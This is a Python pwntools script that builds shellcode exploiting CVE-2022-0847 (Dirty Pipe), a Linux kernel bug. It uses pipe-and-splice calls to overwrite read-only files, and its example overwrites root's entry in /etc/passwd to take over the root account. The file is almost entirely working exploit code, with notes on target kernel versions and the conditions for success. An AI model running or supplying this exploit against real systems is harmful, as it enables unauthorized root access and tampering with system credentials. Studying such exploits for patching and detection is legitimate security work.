from pwn import *
import sys


def example_usage():
    # setting root password to empty string
    data = ":$1$$qRPK7m23GJusamGpoGLby/:0:0::/:/bin/sh\n"
    assembly = cve_2022_0847(_file="/etc/passwd", data=data, offset=len("root"), verbose=True)
    filename = make_elf(assembly, extract=False)
    print(f"Generated executable: {filename}")


def hexlify_shellcode_c_style(shellcode):
    s = shellcode.hex()
    h = [s[i:i+2] for i in range(0, len(s), 2)]
    return "\\x" + "\\x".join(h)


def cve_2022_0847(_file, data, offset, verbose=False):
    AT_FDCWD = -100
    O_RDONLY = 0
    F_GETPIPE_SZ = 1032
    PAGE_SIZE = 4096
    NULL = 0

    SYS_pipe = 22
    SYS_write = 1
    SYS_read = 0

    data_len = len(data)
    assert offset % PAGE_SIZE != 0, "Sorry, cannot start writing at a page boundary"
    next_page = (offset | (PAGE_SIZE - 1)) + 1
    end_offset = offset + data_len
    assert end_offset <= next_page, "Sorry, cannot write across a page boundary"
    if verbose:
        print("It would be good to backup the file you're modifying")
        print("If the exploit doesn't work, check that:")
        print("1. fd of the opened file you want to modify is 3")
        print("2. offset is inside the file, i.e. is less than file's size")
        print("3. end_offset, i.e. offset + data_len, is inside the file, because the file can't be enlarged")
        print("4. Value returned from fcntl is a multiple of PAGE_SIZE")
        print("5. Opened pipes file descriptors are [4, 5]")
        print("6. You're executing on 64 bit architecture")
        print("7. Kernel version of the target is: 5.8 <= X < 5.16")
        print("8. There aren't any other mitigations, like seccomp")
        print()
    
    indent = " " * 4
    prog = ""
    prog += shellcraft.openat(AT_FDCWD, _file, O_RDONLY)
    # return value will be fd 3
    prog += indent + "sub rsp, 0x10\n"
    prog += shellcraft.mov(dest="rdi", src="rsp")
    prog += shellcraft.mov('rax', SYS_pipe)
    prog += indent + "syscall\n"
    # fd of pipes will be 4 and 5
    prog += shellcraft.fcntl(5, F_GETPIPE_SZ)
    # mov return value of fcntl to r15; assume r15 % PAGE_SIZE == 0
    prog += shellcraft.mov(dest="r15", src="rax")
    # need r14 for backup
    prog += shellcraft.mov(dest="r14", src="r15")
    prog += shellcraft.mov('rdi', 5)
    prog += indent + f"sub rsp, {PAGE_SIZE}\n"
    # now esp points to "buffer" variable
    prog += shellcraft.mov(dest="rsi", src="rsp")
    prog += shellcraft.mov("rdx", PAGE_SIZE)
    prog += "for_0_0:\n"
    prog += indent + "test r15, r15\n"
    prog += indent + "jz for_0_1\n"
    prog += shellcraft.mov('rax', SYS_write)
    prog += indent + "syscall\n"
    prog += indent + "sub r15, rdx\n"
    prog += indent + "jmp for_0_0\n"
    prog += "for_0_1:\n"
    
    prog += shellcraft.mov(dest="r15", src="r14")
    prog += shellcraft.mov('rdi', 4)
    prog += "for_1_0:\n"
    prog += indent + "test r15, r15\n"
    prog += indent + "jz for_1_1\n"
    prog += shellcraft.mov('rax', SYS_read)
    prog += indent + "syscall\n"
    prog += indent + "sub r15, rdx\n"
    prog += indent + "jmp for_1_0\n"
    prog += "for_1_1:\n"

    prog += shellcraft.push(offset - 1)
    prog += shellcraft.splice(3, 'rsp', 5, NULL, 1, 0)
    prog += shellcraft.write(5, data, data_len)
    prog += shellcraft.exit_group(0)
    if verbose:
        print(prog)
    return asm(prog)


if __name__ == "__main__":
    context.arch = 'amd64'
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} filename data offset [verbose (any value here sets verbose to True)]")
        exit(0)
    else:
        if len(sys.argv) == 5:
            verbose = True
        else:
            verbose = False
        filename, data, offset = sys.argv[1], sys.argv[2], int(sys.argv[3])
        assembly = cve_2022_0847(filename, data, offset, verbose)
        shellcode = hexlify_shellcode_c_style(assembly)
        print("Resulting shellcode:")
        print(shellcode)
        
